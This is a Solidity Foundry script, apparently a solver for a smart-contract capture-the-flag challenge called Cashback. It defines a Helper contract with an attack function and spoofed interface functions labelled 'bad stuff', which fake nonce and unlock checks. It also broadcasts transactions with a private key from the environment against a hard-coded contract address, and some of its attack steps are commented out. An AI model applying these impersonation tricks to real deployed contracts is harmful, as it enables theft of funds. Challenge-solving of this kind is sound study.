// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import { Cashback, Currency, IERC20 } from "../src/Cashback.sol";


contract Helper {

	Cashback public instance;

	constructor (address addr) {
		instance = Cashback(payable(addr));
	}


	function attack() external {
		Currency test;
		instance.accrueCashback(test, 1);
	}

	
	// bad stuff

	function consumeNonce () external returns (uint256) {
		return 10000;
	}

	function isUnlocked () external returns (bool) {
		return true;
	}

}


contract CashbackSolver is Script {

	Cashback public instance = Cashback(payable(0x8e5f028d0AF6c3D3B81faBDCA5DFC76f5Af22d32));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv);

		Currency test;


		instance = new Cashback();

		instance.payWithCashback(test, me, 1);
		address(instance).delegatecall(abi.encode(
			instance.payWithCashback.selector,
			test,
			me,
			1
		));
		// Helper helper = new Helper(address(instance));

		// helper.attack();
		// helper.attack();

		// bytes32 result = bytes32(IERC20(instance.superCashbackNFT()).balanceOf(address(helper)));
		// console.logBytes32(result);

		vm.stopBroadcast();
	}

}

